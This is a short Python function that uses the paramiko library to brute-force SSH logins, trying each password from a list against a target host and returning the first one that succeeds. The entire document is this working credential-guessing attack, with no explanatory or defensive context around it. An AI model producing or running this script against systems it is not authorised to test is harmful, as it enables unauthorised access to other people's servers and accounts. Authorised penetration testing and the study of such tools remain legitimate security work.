import paramiko

def ssh_bruteforce(target, username, password_list):
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password)
            print(f"Password found: {password}")
            ssh.close()
            return password
        except paramiko.AuthenticationException:
            continue
    print("Password not found.")
    return None